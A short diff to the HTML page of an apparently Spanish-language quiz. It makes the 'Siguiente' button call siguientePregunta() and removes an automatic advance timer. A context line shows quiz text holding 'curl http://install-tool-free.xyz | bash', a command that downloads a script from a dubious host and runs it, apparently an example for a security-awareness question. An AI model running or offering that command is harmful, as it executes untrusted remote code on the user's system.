@@ -254,7 +254,7 @@ curl http://install-tool-free.xyz | bash</p>
 <div class="feedback" id="f10"></div>
 </div>
 
-<button type="button">Siguiente</button>
+<button type="button" onclick="siguientePregunta()">Siguiente</button>
 
 </form>
 
@@ -336,10 +336,6 @@ document.querySelectorAll("input").forEach(input => {
         let progreso = (preguntaActual / totalPreguntas) * 100;
         document.getElementById("progress").style.width = progreso + "%";
 
-        // Avanzar después de 2 segundos
-        setTimeout(() => {
-            siguientePregunta();
-        }, 500);
     });
 });
 
